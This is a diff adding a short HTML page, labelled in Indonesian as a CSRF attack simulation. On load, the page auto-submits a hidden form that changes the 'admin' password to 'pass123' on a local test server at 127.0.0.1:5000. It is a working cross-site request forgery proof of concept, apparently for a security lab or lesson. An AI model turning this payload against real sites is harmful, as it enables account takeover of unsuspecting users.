@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+  <body onload="document.forms[0].submit()">
+    <h2>💀 Simulasi Serangan CSRF: Ubah Password Admin</h2>
+
+    <form action="http://127.0.0.1:5000/change-password" method="POST">
+      <input type="hidden" name="username" value="admin">
+      <input type="hidden" name="new_password" value="pass123">
+      <input type="hidden" name="confirm" value="pass123">
+    </form>
+  </body>
+</html>
